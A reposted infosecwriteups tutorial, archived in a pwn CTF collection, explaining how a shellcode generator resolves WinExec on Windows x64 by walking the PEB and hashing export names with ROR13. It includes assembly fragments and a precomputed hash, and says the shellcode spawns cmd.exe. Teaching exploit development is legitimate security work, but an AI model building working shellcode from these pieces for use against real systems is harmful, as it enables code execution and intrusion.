# :skull: Shellforge Building A Constraint Aware Shellcode Generator From Scratch F57Eaea1

> **Original Source:** [Shellforge Building A Constraint Aware Shellcode Generator From Scratch F57Eaea1](https://infosecwriteups.com/shellforge-building-a-constraint-aware-shellcode-generator-from-scratch-f57eaea15c78)
> **Platform:** infosecwriteups.com | **Category:** `PWN`

---

## Windows: PEB Walking Without Hardcoded Addresses


The Windows synthesiser uses a technique called PEB walking with ROR13 hashing — the same approach used by Metasploit’s Windows stagers.


## Get Oderinde Toluwanimi’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


The challenge on Windows is that you can’t call `WinExec` directly in position-independent shellcode. You don't know where `kernel32.dll` is loaded at runtime (ASLR). Instead, you find it dynamically by walking the Process Environment Block:


```
mov rax, gs:[0x60] ; PEB pointer (always at GS:0x60 on x64)
mov rax, [rax+0x18] ; PEB_LDR_DATA
mov rax, [rax+0x20] ; InMemoryOrderModuleList.Flink
mov rax, [rax] ; skip ntdll (first entry)
mov rax, [rax] ; kernel32 (second entry)
mov rbx, [rax+0x20] ; DllBase = kernel32 base address
```


Once you have the base address of `kernel32.dll`, you walk its export table and find `WinExec` using a ROR13 hash comparison — rotating each character of the function name right by 13 bits and accumulating. The pre-computed hash for `WinExec` is `0x98FE8A0E`.


```
; ROR13 hash loop
movzx edi, byte [rsi] ; load character
test dil, dil ; null terminator?
jz hash_done
ror edx, 13 ; rotate hash right 13
add edx, edi ; accumulate character
inc rsi
jmp hash_loop
```


```
hash_done:
cmp edx, 0x98FE8A0E ; WinExec hash?
jne next_name
```


This was execution-verified on Windows 10 x64 — the shellcode runs, walks the PEB, resolves `WinExec`, and spawns `cmd.exe`.

---

*Originally published on [Medium](https://infosecwriteups.com/shellforge-building-a-constraint-aware-shellcode-generator-from-scratch-f57eaea15c78). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of pwn CTF writeups.*
